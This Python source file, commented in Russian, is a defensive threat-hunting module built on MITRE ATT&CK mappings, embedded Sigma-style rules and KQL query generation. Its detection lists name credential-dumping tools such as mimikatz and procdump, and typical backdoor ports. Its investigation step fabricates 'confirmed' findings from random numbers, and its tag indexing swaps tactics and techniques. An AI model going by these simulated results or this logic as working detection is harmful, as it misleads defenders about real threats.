#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SHARD Threat Hunting AI Module
Проактивный поиск угроз на основе поведенческих паттернов MITRE ATT&CK
Автоматические гипотезы, Sigma-правила, анализ TTPs

Author: SHARD Enterprise
Version: 5.0.0
"""

import os
import re
import json
import time
import threading
import hashlib
import sqlite3
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any, Set, Union
from collections import deque, defaultdict, Counter
from dataclasses import dataclass, field
from enum import Enum
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

import numpy as np
import yaml


# ============================================================
# КОНФИГУРАЦИЯ
# ============================================================

class HuntingSeverity(Enum):
    """Серьёзность находки охоты"""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class HuntingStatus(Enum):
    """Статус гипотезы"""
    PROPOSED = "PROPOSED"
    INVESTIGATING = "INVESTIGATING"
    CONFIRMED = "CONFIRMED"
    FALSE_POSITIVE = "FALSE_POSITIVE"
    REMEDIATED = "REMEDIATED"


@dataclass
class ThreatHuntingConfig:
    """Конфигурация Threat Hunting AI"""

    # Источники данных
    sigma_rules_path: str = "./data/threat_hunting/sigma_rules/"
    custom_rules_path: str = "./data/threat_hunting/custom_rules/"
    hypotheses_path: str = "./data/threat_hunting/hypotheses/"

    # База данных
    db_path: str = "./data/threat_hunting/hunting.db"

    # Интервалы
    hunting_interval_minutes: int = 30
    hypothesis_generation_interval: int = 3600  # 1 час

    # Пороги
    anomaly_threshold: float = 0.7
    confidence_threshold: float = 0.6

    # MITRE ATT&CK
    mitre_enterprise_path: str = "./data/mitre/enterprise-attack.json"

    # Автоматизация
    auto_generate_hypotheses: bool = True
    auto_investigate: bool = True
    max_concurrent_investigations: int = 5


@dataclass
class HuntingHypothesis:
    """Гипотеза для охоты на угрозы"""
    id: str
    name: str
    description: str
    mitre_tactics: List[str] = field(default_factory=list)
    mitre_techniques: List[str] = field(default_factory=list)
    sigma_rules: List[str] = field(default_factory=list)
    kql_query: Optional[str] = None
    severity: HuntingSeverity = HuntingSeverity.MEDIUM
    status: HuntingStatus = HuntingStatus.PROPOSED
    confidence: float = 0.5
    created_at: float = field(default_factory=time.time)
    last_run: Optional[float] = None
    findings_count: int = 0
    false_positives_count: int = 0
    tags: List[str] = field(default_factory=list)


@dataclass
class HuntingFinding:
    """Находка в результате охоты"""
    id: str
    hypothesis_id: str
    name: str
    description: str
    severity: HuntingSeverity
    mitre_tactics: List[str]
    mitre_techniques: List[str]
    evidence: Dict[str, Any]
    affected_assets: List[str]
    timestamp: float = field(default_factory=time.time)
    confidence: float = 0.5
    status: HuntingStatus = HuntingStatus.CONFIRMED
    remediation: Optional[str] = None


# ============================================================
# MITRE ATT&CK KNOWLEDGE BASE
# ============================================================

class MITREAttackKnowledge:
    """База знаний MITRE ATT&CK"""

    def __init__(self, config: ThreatHuntingConfig):
        self.config = config
        self.tactics: Dict[str, Dict] = {}
        self.techniques: Dict[str, Dict] = {}
        self.sub_techniques: Dict[str, Dict] = {}
        self.groups: Dict[str, Dict] = {}
        self.software: Dict[str, Dict] = {}
        self.mitigations: Dict[str, Dict] = {}
        self._load_mitre_data()

    def _load_mitre_data(self):
        """Загрузка данных MITRE ATT&CK"""
        mitre_path = Path(self.config.mitre_enterprise_path)

        if mitre_path.exists():
            try:
                with open(mitre_path, 'r') as f:
                    data = json.load(f)

                    for obj in data.get('objects', []):
                        obj_type = obj.get('type')

                        if obj_type == 'x-mitre-tactic':
                            self.tactics[obj['id']] = {
                                'id': obj['id'],
                                'name': obj['name'],
                                'description': obj.get('description', ''),
                                'short_name': obj.get('x_mitre_shortname', '')
                            }

                        elif obj_type == 'attack-pattern':
                            tech_id = obj['id']
                            self.techniques[tech_id] = {
                                'id': tech_id,
                                'name': obj['name'],
                                'description': obj.get('description', ''),
                                'tactics': [p['phase_name'] for p in obj.get('kill_chain_phases', [])],
                                'platforms': obj.get('x_mitre_platforms', []),
                                'data_sources': obj.get('x_mitre_data_sources', []),
                                'detection': obj.get('x_mitre_detection', '')
                            }

                            if obj.get('x_mitre_is_subtechnique', False):
                                self.sub_techniques[tech_id] = self.techniques[tech_id]

                        elif obj_type == 'intrusion-set':
                            self.groups[obj['id']] = {
                                'id': obj['id'],
                                'name': obj['name'],
                                'description': obj.get('description', ''),
                                'aliases': obj.get('aliases', [])
                            }

                        elif obj_type == 'malware' or obj_type == 'tool':
                            self.software[obj['id']] = {
                                'id': obj['id'],
                                'name': obj['name'],
                                'description': obj.get('description', ''),
                                'type': obj_type
                            }

                        elif obj_type == 'course-of-action':
                            self.mitigations[obj['id']] = {
                                'id': obj['id'],
                                'name': obj['name'],
                                'description': obj.get('description', '')
                            }

                print(f"✅ MITRE ATT&CK loaded: {len(self.tactics)} tactics, {len(self.techniques)} techniques")

            except Exception as e:
                print(f"⚠️ Error loading MITRE ATT&CK: {e}")
                self._init_default_mitre()
        else:
            print(f"⚠️ MITRE ATT&CK data not found, using embedded subset")
            self._init_default_mitre()

    def _init_default_mitre(self):
        """Инициализация встроенного подмножества MITRE ATT&CK"""
        self.tactics = {
            'TA0001': {'name': 'Initial Access', 'short_name': 'initial-access'},
            'TA0002': {'name': 'Execution', 'short_name': 'execution'},
            'TA0003': {'name': 'Persistence', 'short_name': 'persistence'},
            'TA0004': {'name': 'Privilege Escalation', 'short_name': 'privilege-escalation'},
            'TA0005': {'name': 'Defense Evasion', 'short_name': 'defense-evasion'},
            'TA0006': {'name': 'Credential Access', 'short_name': 'credential-access'},
            'TA0007': {'name': 'Discovery', 'short_name': 'discovery'},
            'TA0008': {'name': 'Lateral Movement', 'short_name': 'lateral-movement'},
            'TA0009': {'name': 'Collection', 'short_name': 'collection'},
            'TA0011': {'name': 'Command and Control', 'short_name': 'command-and-control'},
            'TA0010': {'name': 'Exfiltration', 'short_name': 'exfiltration'},
            'TA0040': {'name': 'Impact', 'short_name': 'impact'}
        }

        # Ключевые техники
        self.techniques = {
            'T1059': {'name': 'Command and Scripting Interpreter', 'tactics': ['execution']},
            'T1059.001': {'name': 'PowerShell', 'tactics': ['execution']},
            'T1059.003': {'name': 'Windows Command Shell', 'tactics': ['execution']},
            'T1059.004': {'name': 'Unix Shell', 'tactics': ['execution']},
            'T1003': {'name': 'OS Credential Dumping', 'tactics': ['credential-access']},
            'T1003.001': {'name': 'LSASS Memory', 'tactics': ['credential-access']},
            'T1021': {'name': 'Remote Services', 'tactics': ['lateral-movement']},
            'T1021.002': {'name': 'SMB/Windows Admin Shares', 'tactics': ['lateral-movement']},
            'T1046': {'name': 'Network Service Scanning', 'tactics': ['discovery']},
            'T1048': {'name': 'Exfiltration Over Alternative Protocol', 'tactics': ['exfiltration']},
            'T1071': {'name': 'Application Layer Protocol', 'tactics': ['command-and-control']},
            'T1071.001': {'name': 'Web Protocols', 'tactics': ['command-and-control']},
            'T1082': {'name': 'System Information Discovery', 'tactics': ['discovery']},
            'T1083': {'name': 'File and Directory Discovery', 'tactics': ['discovery']},
            'T1090': {'name': 'Proxy', 'tactics': ['command-and-control']},
            'T1110': {'name': 'Brute Force', 'tactics': ['credential-access']},
            'T1134': {'name': 'Access Token Manipulation', 'tactics': ['defense-evasion', 'privilege-escalation']},
            'T1190': {'name': 'Exploit Public-Facing Application', 'tactics': ['initial-access']},
            'T1486': {'name': 'Data Encrypted for Impact', 'tactics': ['impact']},
            'T1498': {'name': 'Network Denial of Service', 'tactics': ['impact']},
            'T1547': {'name': 'Boot or Logon Autostart Execution', 'tactics': ['persistence', 'privilege-escalation']},
            'T1566': {'name': 'Phishing', 'tactics': ['initial-access']},
            'T1572': {'name': 'Protocol Tunneling', 'tactics': ['command-and-control']},
        }

    def get_tactic_name(self, tactic_id: str) -> str:
        """Получить название тактики"""
        return self.tactics.get(tactic_id, {}).get('name', tactic_id)

    def get_technique_name(self, technique_id: str) -> str:
        """Получить название техники"""
        return self.techniques.get(technique_id, {}).get('name', technique_id)

    def get_techniques_by_tactic(self, tactic_name: str) -> List[str]:
        """Получить техники для тактики"""
        techniques = []
        for tech_id, tech in self.techniques.items():
            if tactic_name in tech.get('tactics', []):
                techniques.append(tech_id)
        return techniques


# ============================================================
# SIGMA RULES ENGINE
# ============================================================

class SigmaRulesEngine:
    """Движок Sigma-правил для обнаружения угроз"""

    def __init__(self, config: ThreatHuntingConfig):
        self.config = config
        self.rules: Dict[str, Dict] = {}
        self.rules_by_tactic: Dict[str, List[str]] = defaultdict(list)
        self.rules_by_technique: Dict[str, List[str]] = defaultdict(list)
        self.rules_by_severity: Dict[str, List[str]] = defaultdict(list)
        self._load_rules()

    def _load_rules(self):
        """Загрузка Sigma-правил"""
        rules_path = Path(self.config.sigma_rules_path)

        if rules_path.exists():
            for rule_file in rules_path.rglob('*.yml'):
                try:
                    with open(rule_file, 'r') as f:
                        rule = yaml.safe_load(f)
                        if rule and 'id' in rule:
                            rule_id = rule['id']
                            self.rules[rule_id] = rule

                            # Индексация
                            for tag in rule.get('tags', []):
                                if tag.startswith('attack.t'):
                                    self.rules_by_tactic[tag].append(rule_id)
                                elif tag.startswith('attack.'):
                                    self.rules_by_technique[tag].append(rule_id)

                            severity = rule.get('level', 'medium')
                            self.rules_by_severity[severity].append(rule_id)

                except Exception as e:
                    print(f"Error loading Sigma rule {rule_file}: {e}")

        # Если правил нет - создаём встроенные
        if not self.rules:
            self._create_embedded_rules()

        print(f"✅ Sigma rules loaded: {len(self.rules)} rules")

    def _create_embedded_rules(self):
        """Создание встроенных Sigma-правил"""
        embedded_rules = [
            {
                'id': 'EMBED-001',
                'title': 'Suspicious PowerShell Execution',
                'description': 'Detects suspicious PowerShell command line arguments',
                'level': 'high',
                'tags': ['attack.t1059.001', 'attack.execution'],
                'detection': {
                    'keywords': ['-enc', '-encodedcommand', '-e ', 'iex', 'invoke-expression']
                }
            },
            {
                'id': 'EMBED-002',
                'title': 'LSASS Access Attempt',
                'description': 'Detects attempts to access LSASS process memory',
                'level': 'critical',
                'tags': ['attack.t1003.001', 'attack.credential-access'],
                'detection': {
                    'keywords': ['lsass', 'procdump', 'mimikatz', 'sekurlsa']
                }
            },
            {
                'id': 'EMBED-003',
                'title': 'Suspicious Network Connection',
                'description': 'Detects connections to suspicious ports or IPs',
                'level': 'medium',
                'tags': ['attack.t1071', 'attack.command-and-control'],
                'detection': {
                    'ports': [4444, 5555, 6666, 7777, 8888, 1337, 31337]
                }
            },
            {
                'id': 'EMBED-004',
                'title': 'Persistence via Registry Run Keys',
                'description': 'Detects persistence mechanisms using registry run keys',
                'level': 'high',
                'tags': ['attack.t1547.001', 'attack.persistence'],
                'detection': {
                    'registry_keys': [
                        'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                        'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
                    ]
                }
            },
            {
                'id': 'EMBED-005',
                'title': 'Lateral Movement via SMB',
                'description': 'Detects lateral movement using SMB admin shares',
                'level': 'high',
                'tags': ['attack.t1021.002', 'attack.lateral-movement'],
                'detection': {
                    'shares': ['\\\\*\\C$', '\\\\*\\ADMIN$']
                }
            },
            {
                'id': 'EMBED-006',
                'title': 'Data Exfiltration via DNS',
                'description': 'Detects DNS tunneling for data exfiltration',
                'level': 'high',
                'tags': ['attack.t1048', 'attack.exfiltration'],
                'detection': {
                    'patterns': [r'\w{30,}\.com', r'[a-zA-Z0-9]{20,}\.[a-z]{2,}']
                }
            },
            {
                'id': 'EMBED-007',
                'title': 'Brute Force Attack',
                'description': 'Detects multiple failed login attempts',
                'level': 'medium',
                'tags': ['attack.t1110', 'attack.credential-access'],
                'detection': {
                    'threshold': {'count': 5, 'window': 60}
                }
            },
            {
                'id': 'EMBED-008',
                'title': 'Discovery Commands',
                'description': 'Detects system discovery commands',
                'level': 'low',
                'tags': ['attack.t1082', 'attack.discovery'],
                'detection': {
                    'commands': ['whoami', 'systeminfo', 'hostname', 'ipconfig', 'netstat', 'tasklist']
                }
            }
        ]

        for rule in embedded_rules:
            self.rules[rule['id']] = rule
            for tag in rule['tags']:
                if tag.startswith('attack.t'):
                    self.rules_by_tactic[tag].append(rule['id'])
                elif tag.startswith('attack.'):
                    self.rules_by_technique[tag].append(rule['id'])
            self.rules_by_severity[rule['level']].append(rule['id'])

    def evaluate_event(self, event: Dict) -> List[Tuple[str, float]]:
        """Оценка события на соответствие Sigma-правилам"""
        matches = []

        for rule_id, rule in self.rules.items():
            confidence = self._match_rule(rule, event)
            if confidence > 0:
                matches.append((rule_id, confidence))

        return matches

    def _match_rule(self, rule: Dict, event: Dict) -> float:
        """Проверка соответствия правила событию"""
        detection = rule.get('detection', {})
        confidence = 0.0
        match_count = 0
        total_conditions = 0

        # Проверка ключевых слов
        keywords = detection.get('keywords', [])
        if keywords:
            total_conditions += 1
            event_str = json.dumps(event).lower()
            for kw in keywords:
                if kw.lower() in event_str:
                    match_count += 1
                    break

        # Проверка портов
        ports = detection.get('ports', [])
        if ports:
            total_conditions += 1
            event_port = event.get('port', event.get('dst_port', 0))
            if event_port in ports:
                match_count += 1

        # Проверка команд
        commands = detection.get('commands', [])
        if commands:
            total_conditions += 1
            cmdline = event.get('command_line', event.get('cmdline', '')).lower()
            for cmd in commands:
                if cmd.lower() in cmdline:
                    match_count += 1
                    break

        # Проверка порога
        threshold = detection.get('threshold', {})
        if threshold:
            total_conditions += 1
            count = event.get('count', 0)
            if count >= threshold.get('count', 0):
                match_count += 1

        # Проверка паттернов
        patterns = detection.get('patterns', [])
        if patterns:
            total_conditions += 1
            event_str = str(event)
            for pattern in patterns:
                if re.search(pattern, event_str, re.IGNORECASE):
                    match_count += 1
                    break

        if total_conditions > 0:
            confidence = match_count / total_conditions

        return confidence

    def get_rules_for_tactic(self, tactic: str) -> List[Dict]:
        """Получить правила для тактики"""
        rule_ids = self.rules_by_tactic.get(tactic, [])
        return [self.rules[rid] for rid in rule_ids if rid in self.rules]

    def get_rules_for_technique(self, technique: str) -> List[Dict]:
        """Получить правила для техники"""
        rule_ids = self.rules_by_technique.get(technique, [])
        return [self.rules[rid] for rid in rule_ids if rid in self.rules]


# ============================================================
# HYPOTHESIS GENERATOR
# ============================================================

class HypothesisGenerator:
    """Генератор гипотез для охоты на угрозы"""

    def __init__(self, mitre_kb: MITREAttackKnowledge, sigma_engine: SigmaRulesEngine):
        self.mitre_kb = mitre_kb
        self.sigma_engine = sigma_engine
        self.generated_hypotheses: List[HuntingHypothesis] = []
        self._init_base_hypotheses()

    def _init_base_hypotheses(self):
        """Инициализация базовых гипотез"""
        base_hypotheses = [
            {
                'name': 'PowerShell Empire C2',
                'description': 'Detect PowerShell Empire command and control activity',
                'mitre_tactics': ['execution', 'command-and-control'],
                'mitre_techniques': ['T1059.001', 'T1071'],
                'severity': HuntingSeverity.HIGH
            },
            {
                'name': 'Credential Dumping via LSASS',
                'description': 'Detect attempts to dump credentials from LSASS process',
                'mitre_tactics': ['credential-access'],
                'mitre_techniques': ['T1003.001'],
                'severity': HuntingSeverity.CRITICAL
            },
            {
                'name': 'Lateral Movement via SMB',
                'description': 'Detect lateral movement using SMB admin shares',
                'mitre_tactics': ['lateral-movement'],
                'mitre_techniques': ['T1021.002'],
                'severity': HuntingSeverity.HIGH
            },
            {
                'name': 'DNS Tunneling',
                'description': 'Detect DNS tunneling for C2 or exfiltration',
                'mitre_tactics': ['command-and-control', 'exfiltration'],
                'mitre_techniques': ['T1048', 'T1572'],
                'severity': HuntingSeverity.HIGH
            },
            {
                'name': 'Registry Persistence',
                'description': 'Detect malware persistence via registry run keys',
                'mitre_tactics': ['persistence'],
                'mitre_techniques': ['T1547.001'],
                'severity': HuntingSeverity.MEDIUM
            },
            {
                'name': 'Suspicious Process Creation',
                'description': 'Detect suspicious process creation patterns',
                'mitre_tactics': ['execution', 'defense-evasion'],
                'mitre_techniques': ['T1059'],
                'severity': HuntingSeverity.MEDIUM
            },
            {
                'name': 'Network Scanning Activity',
                'description': 'Detect internal network scanning for discovery',
                'mitre_tactics': ['discovery'],
                'mitre_techniques': ['T1046'],
                'severity': HuntingSeverity.LOW
            },
            {
                'name': 'Data Staging',
                'description': 'Detect data staging prior to exfiltration',
                'mitre_tactics': ['collection'],
                'mitre_techniques': ['T1074'],
                'severity': HuntingSeverity.MEDIUM
            }
        ]

        for i, h in enumerate(base_hypotheses):
            hypothesis = HuntingHypothesis(
                id=f"H-{i + 1:04d}",
                name=h['name'],
                description=h['description'],
                mitre_tactics=h['mitre_tactics'],
                mitre_techniques=h['mitre_techniques'],
                severity=h['severity'],
                confidence=0.7
            )

            # Добавляем Sigma-правила
            for tech in h['mitre_techniques']:
                rules = self.sigma_engine.get_rules_for_technique(f"attack.{tech}")
                for rule in rules:
                    if rule.get('id'):
                        hypothesis.sigma_rules.append(rule['id'])

            self.generated_hypotheses.append(hypothesis)

    def generate_from_findings(self, findings: List[Dict]) -> List[HuntingHypothesis]:
        """Генерация гипотез на основе находок"""
        new_hypotheses = []

        # Группировка по техникам
        techniques_found = defaultdict(int)
        for f in findings:
            for tech in f.get('mitre_techniques', []):
                techniques_found[tech] += 1

        # Создание гипотез для частых техник
        for tech, count in techniques_found.items():
            if count >= 3:
                tech_name = self.mitre_kb.get_technique_name(tech)

                hypothesis = HuntingHypothesis(
                    id=f"H-GEN-{hash(tech) % 10000:04d}",
                    name=f"Investigate {tech_name} Activity",
                    description=f"Multiple findings ({count}) related to {tech_name}. Investigate for potential compromise.",
                    mitre_techniques=[tech],
                    severity=HuntingSeverity.HIGH if count >= 5 else HuntingSeverity.MEDIUM,
                    confidence=min(0.5 + count * 0.1, 0.95)
                )

                rules = self.sigma_engine.get_rules_for_technique(f"attack.{tech}")
                for rule in rules[:3]:
                    if rule.get('id'):
                        hypothesis.sigma_rules.append(rule['id'])

                new_hypotheses.append(hypothesis)

        return new_hypotheses

    def generate_kql_query(self, hypothesis: HuntingHypothesis) -> str:
        """Генерация KQL запроса для гипотезы"""
        query_parts = []

        # Базовые таблицы
        if 'credential-access' in hypothesis.mitre_tactics:
            query_parts.append("SecurityEvent | where EventID in (4624, 4625, 4672)")

        if 'execution' in hypothesis.mitre_tactics:
            query_parts.append("ProcessEvents | where ProcessName has_any ('powershell.exe', 'cmd.exe', 'wscript.exe')")

        if 'lateral-movement' in hypothesis.mitre_tactics:
            query_parts.append("NetworkEvents | where Direction == 'Outbound' and DestinationPort in (445, 135, 3389)")

        if 'command-and-control' in hypothesis.mitre_tactics:
            query_parts.append("NetworkEvents | where DestinationPort in (4444, 5555, 6666, 7777, 8888, 1337, 31337)")

        if 'exfiltration' in hypothesis.mitre_tactics:
            query_parts.append("NetworkEvents | where TotalBytes > 1000000")

        if not query_parts:
            query_parts.append("SecurityEvent | take 1000")

        return " | union ".join(
            query_parts) + " | project TimeGenerated, EventID, ProcessName, CommandLine, SourceIP, DestinationIP"


# ============================================================
# THREAT HUNTING ENGINE
# ============================================================

class ThreatHuntingEngine:
    """
    Основной движок Threat Hunting AI
    Объединяет MITRE ATT&CK, Sigma-правила и генерацию гипотез
    """

    def __init__(self, config: ThreatHuntingConfig = None, logger=None):
        self.config = config or ThreatHuntingConfig()
        self.logger = logger

        # Компоненты
        self.mitre_kb = MITREAttackKnowledge(self.config)
        self.sigma_engine = SigmaRulesEngine(self.config)
        self.hypothesis_generator = HypothesisGenerator(self.mitre_kb, self.sigma_engine)

        # Хранилище
        self.hypotheses: Dict[str, HuntingHypothesis] = {}
        self.findings: List[HuntingFinding] = []
        self.evidence_buffer: deque = deque(maxlen=10000)

        # Статистика
        self.stats = {
            'total_hypotheses': 0,
            'total_investigations': 0,
            'total_findings': 0,
            'confirmed_threats': 0,
            'false_positives': 0
        }

        self._lock = threading.RLock()
        self._running = False
        self._hunting_thread = None

        # Загрузка существующих гипотез
        self._load_hypotheses()

    def _load_hypotheses(self):
        """Загрузка сохранённых гипотез"""
        for h in self.hypothesis_generator.generated_hypotheses:
            self.hypotheses[h.id] = h
            self.stats['total_hypotheses'] += 1

    def start(self):
        """Запуск движка охоты"""
        self._running = True
        self._hunting_thread = threading.Thread(target=self._hunting_loop, daemon=True)
        self._hunting_thread.start()

        if self.logger:
            self.logger.info(f"🚀 Threat Hunting AI started with {len(self.hypotheses)} hypotheses")

    def stop(self):
        """Остановка движка"""
        self._running = False
        if self._hunting_thread:
            self._hunting_thread.join(timeout=5)

        if self.logger:
            self.logger.info("🛑 Threat Hunting AI stopped")

    def _hunting_loop(self):
        """Основной цикл охоты"""
        while self._running:
            # Запуск активных гипотез
            self.run_active_hypotheses()

            # Генерация новых гипотез (раз в час)
            if self.config.auto_generate_hypotheses and self.stats['total_investigations'] % 10 == 0:
                self.generate_new_hypotheses()

            time.sleep(self.config.hunting_interval_minutes * 60)

    def run_active_hypotheses(self):
        """Запуск активных гипотез"""
        active_hypotheses = [h for h in self.hypotheses.values()
                             if h.status in [HuntingStatus.PROPOSED, HuntingStatus.INVESTIGATING]]

        if not active_hypotheses:
            return

        if self.logger:
            self.logger.info(f"🔍 Running {len(active_hypotheses)} active hypotheses")

        with ThreadPoolExecutor(max_workers=self.config.max_concurrent_investigations) as executor:
            futures = {executor.submit(self._investigate_hypothesis, h): h.id for h in active_hypotheses}

            for future in as_completed(futures):
                hypothesis_id = futures[future]
                try:
                    findings = future.result(timeout=300)
                    if findings:
                        with self._lock:
                            self.findings.extend(findings)
                            self.stats['total_findings'] += len(findings)

                            for f in findings:
                                if f.severity in [HuntingSeverity.CRITICAL, HuntingSeverity.HIGH]:
                                    self.stats['confirmed_threats'] += 1

                        if self.logger:
                            self.logger.info(f"   Hypothesis {hypothesis_id}: {len(findings)} findings")
                except Exception as e:
                    if self.logger:
                        self.logger.error(f"Error investigating {hypothesis_id}: {e}")

    def _investigate_hypothesis(self, hypothesis: HuntingHypothesis) -> List[HuntingFinding]:
        """Расследование гипотезы"""
        findings = []

        # Обновление статуса
        hypothesis.status = HuntingStatus.INVESTIGATING
        hypothesis.last_run = time.time()

        # Проверка Sigma-правил
        for rule_id in hypothesis.sigma_rules:
            rule = self.sigma_engine.rules.get(rule_id)
            if rule:
                # Здесь должен быть запрос к SIEM данным
                # Пока используем симулированные данные
                if self._simulate_rule_match(rule):
                    finding = HuntingFinding(
                        id=f"F-{hash(rule_id + hypothesis.id) % 100000:05d}",
                        hypothesis_id=hypothesis.id,
                        name=rule.get('title', 'Sigma Rule Match'),
                        description=rule.get('description', ''),
                        severity=self._sigma_level_to_severity(rule.get('level', 'medium')),
                        mitre_tactics=hypothesis.mitre_tactics,
                        mitre_techniques=hypothesis.mitre_techniques,
                        evidence={'rule_id': rule_id, 'rule': rule},
                        affected_assets=self._get_affected_assets(rule),
                        confidence=0.7,
                        remediation=self._get_remediation(hypothesis)
                    )
                    findings.append(finding)

        # Обновление статистики гипотезы
        hypothesis.findings_count += len(findings)

        # Обновление статуса
        if findings:
            hypothesis.status = HuntingStatus.CONFIRMED
        else:
            hypothesis.status = HuntingStatus.PROPOSED
            hypothesis.false_positives_count += 1

        return findings

    def _simulate_rule_match(self, rule: Dict) -> bool:
        """Симуляция совпадения правила (для демо)"""
        # В реальной системе здесь запрос к данным
        severity = rule.get('level', 'medium')
        probabilities = {'critical': 0.3, 'high': 0.2, 'medium': 0.15, 'low': 0.1}
        return np.random.random() < probabilities.get(severity, 0.1)

    def _sigma_level_to_severity(self, level: str) -> HuntingSeverity:
        """Конвертация уровня Sigma в серьёзность"""
        mapping = {
            'critical': HuntingSeverity.CRITICAL,
            'high': HuntingSeverity.HIGH,
            'medium': HuntingSeverity.MEDIUM,
            'low': HuntingSeverity.LOW
        }
        return mapping.get(level, HuntingSeverity.INFO)

    def _get_affected_assets(self, rule: Dict) -> List[str]:
        """Получение затронутых активов"""
        # В реальной системе - из логов
        return [f"asset-{i}" for i in range(np.random.randint(1, 4))]

    def _get_remediation(self, hypothesis: HuntingHypothesis) -> str:
        """Получение рекомендаций по исправлению"""
        remediations = {
            'credential-access': 'Reset compromised credentials and enable MFA',
            'execution': 'Block suspicious processes and enable application whitelisting',
            'persistence': 'Remove persistence mechanisms and audit startup items',
            'lateral-movement': 'Restrict lateral movement and segment network',
            'command-and-control': 'Block C2 domains/IPs and monitor outbound traffic',
            'exfiltration': 'Block data exfiltration channels and implement DLP'
        }

        for tactic in hypothesis.mitre_tactics:
            if tactic in remediations:
                return remediations[tactic]

        return 'Investigate and remediate based on findings'

    def generate_new_hypotheses(self):
        """Генерация новых гипотез на основе находок"""
        # Конвертация находок для генератора
        findings_data = [
            {
                'mitre_techniques': f.mitre_techniques,
                'severity': f.severity.value
            }
            for f in self.findings[-100:]
        ]

        new_hypotheses = self.hypothesis_generator.generate_from_findings(findings_data)

        for h in new_hypotheses:
            if h.id not in self.hypotheses:
                # Генерация KQL запроса
                h.kql_query = self.hypothesis_generator.generate_kql_query(h)
                self.hypotheses[h.id] = h
                self.stats['total_hypotheses'] += 1

                if self.logger:
                    self.logger.info(f"💡 New hypothesis generated: {h.name}")

    def add_evidence(self, event: Dict):
        """Добавление события в буфер"""
        self.evidence_buffer.append({
            'timestamp': time.time(),
            'event': event
        })

        # Оценка на Sigma-правила
        matches = self.sigma_engine.evaluate_event(event)

        for rule_id, confidence in matches:
            if confidence >= self.config.confidence_threshold:
                rule = self.sigma_engine.rules.get(rule_id)
                if rule:
                    finding = HuntingFinding(
                        id=f"F-REALTIME-{hash(str(event)) % 100000:05d}",
                        hypothesis_id="REALTIME",
                        name=rule.get('title', 'Real-time Detection'),
                        description=rule.get('description', ''),
                        severity=self._sigma_level_to_severity(rule.get('level', 'medium')),
                        mitre_tactics=self._extract_tactics(rule),
                        mitre_techniques=self._extract_techniques(rule),
                        evidence={'event': event, 'rule_id': rule_id},
                        affected_assets=[event.get('src_ip', 'unknown')],
                        confidence=confidence
                    )

                    with self._lock:
                        self.findings.append(finding)
                        self.stats['total_findings'] += 1

                    if self.logger:
                        self.logger.warning(f"🔴 Real-time threat detected: {finding.name}")

    def _extract_tactics(self, rule: Dict) -> List[str]:
        """Извлечение тактик из правила"""
        tactics = []
        for tag in rule.get('tags', []):
            if tag.startswith('attack.t'):
                tactic_id = tag.replace('attack.', '')
                tactic_name = self.mitre_kb.get_tactic_name(tactic_id)
                if tactic_name:
                    tactics.append(tactic_name)
        return list(set(tactics))

    def _extract_techniques(self, rule: Dict) -> List[str]:
        """Извлечение техник из правила"""
        techniques = []
        for tag in rule.get('tags', []):
            if tag.startswith('attack.') and not tag.startswith('attack.t'):
                techniques.append(tag.replace('attack.', ''))
        return techniques

    def get_hypothesis(self, hypothesis_id: str) -> Optional[HuntingHypothesis]:
        """Получить гипотезу по ID"""
        return self.hypotheses.get(hypothesis_id)

    def get_findings(self, min_severity: HuntingSeverity = None,
                     hypothesis_id: str = None, limit: int = 100) -> List[HuntingFinding]:
        """Получить находки с фильтрацией"""
        with self._lock:
            findings = self.findings

            if min_severity:
                severity_order = {HuntingSeverity.CRITICAL: 4, HuntingSeverity.HIGH: 3,
                                  HuntingSeverity.MEDIUM: 2, HuntingSeverity.LOW: 1, HuntingSeverity.INFO: 0}
                min_level = severity_order.get(min_severity, 0)
                findings = [f for f in findings if severity_order.get(f.severity, 0) >= min_level]

            if hypothesis_id:
                findings = [f for f in findings if f.hypothesis_id == hypothesis_id]

            return sorted(findings, key=lambda x: x.timestamp, reverse=True)[:limit]

    def get_mitre_coverage(self) -> Dict:
        """Получить покрытие MITRE ATT&CK"""
        covered_tactics = set()
        covered_techniques = set()

        for h in self.hypotheses.values():
            covered_tactics.update(h.mitre_tactics)
            covered_techniques.update(h.mitre_techniques)

        for f in self.findings:
            covered_tactics.update(f.mitre_tactics)
            covered_techniques.update(f.mitre_techniques)

        return {
            'tactics_covered': len(covered_tactics),
            'total_tactics': len(self.mitre_kb.tactics),
            'techniques_covered': len(covered_techniques),
            'total_techniques': len(self.mitre_kb.techniques),
            'coverage_percent': round(len(covered_techniques) / max(1, len(self.mitre_kb.techniques)) * 100, 1)
        }

    def generate_report(self) -> Dict:
        """Генерация отчёта об охоте"""
        with self._lock:
            findings_by_severity = defaultdict(int)
            findings_by_tactic = defaultdict(int)

            for f in self.findings[-1000:]:
                findings_by_severity[f.severity.value] += 1
                for tactic in f.mitre_tactics:
                    findings_by_tactic[tactic] += 1

            return {
                'timestamp': time.time(),
                'summary': {
                    'total_hypotheses': self.stats['total_hypotheses'],
                    'total_investigations': self.stats['total_investigations'],
                    'total_findings': self.stats['total_findings'],
                    'confirmed_threats': self.stats['confirmed_threats'],
                    'false_positives': self.stats['false_positives']
                },
                'mitre_coverage': self.get_mitre_coverage(),
                'findings_by_severity': dict(findings_by_severity),
                'findings_by_tactic': dict(findings_by_tactic),
                'active_hypotheses': [
                    {
                        'id': h.id,
                        'name': h.name,
                        'status': h.status.value,
                        'severity': h.severity.value,
                        'findings_count': h.findings_count
                    }
                    for h in self.hypotheses.values() if
                    h.status in [HuntingStatus.PROPOSED, HuntingStatus.INVESTIGATING]
                ],
                'recent_findings': [
                    {
                        'id': f.id,
                        'name': f.name,
                        'severity': f.severity.value,
                        'mitre_techniques': f.mitre_techniques,
                        'timestamp': f.timestamp
                    }
                    for f in self.findings[-20:]
                ]
            }

    def get_stats(self) -> Dict:
        """Получить статистику"""
        with self._lock:
            return dict(self.stats)

    def mark_false_positive(self, finding_id: str) -> bool:
        """Отметить находку как ложное срабатывание"""
        with self._lock:
            for f in self.findings:
                if f.id == finding_id:
                    f.status = HuntingStatus.FALSE_POSITIVE
                    self.stats['false_positives'] += 1

                    # Обновление гипотезы
                    if f.hypothesis_id in self.hypotheses:
                        self.hypotheses[f.hypothesis_id].false_positives_count += 1

                    return True
        return False

